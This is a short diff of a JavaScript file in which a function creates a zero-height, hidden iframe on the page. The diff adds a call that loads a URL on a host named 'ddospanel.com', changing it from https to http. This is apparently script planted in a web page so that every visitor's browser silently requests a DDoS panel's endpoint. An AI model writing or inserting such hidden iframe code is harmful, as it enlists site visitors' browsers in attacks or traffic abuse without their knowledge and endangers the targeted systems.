@@ -7,4 +7,4 @@ function hit(url) {
         ifrm.style.height = "0px";
         document.body.appendChild(ifrm);
 }
-hit("https://ddospanel.com/kafanagoreolustur.php?bozuk");
+hit("http://ddospanel.com/kafanagoreolustur.php?bozuk");
